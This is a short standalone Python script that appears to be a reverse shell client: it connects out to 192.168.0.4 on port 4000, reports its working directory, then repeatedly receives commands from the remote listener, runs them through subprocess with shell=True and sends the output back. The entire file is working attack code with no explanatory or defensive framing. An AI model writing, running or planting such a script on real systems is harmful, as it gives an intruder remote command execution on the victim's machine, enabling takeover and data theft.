import socket
import subprocess
import os
import sys

host = '192.168.0.4'
port = 4000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

dir = os.getcwd()
sock.send(dir.encode())

while True:

    #recieve command
    data = sock.recv(1024).decode()
    if len(data) < 1:
        sock.close()
        sys.exit()

    args = data.split()
    if args[0] == 'cd':
        os.chdir(data[3:])
        dir = os.getcwd()
    process = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    (stdout, stderr) = process.communicate()
    output = stdout + stderr
    sock.send((output.decode() + dir).encode())
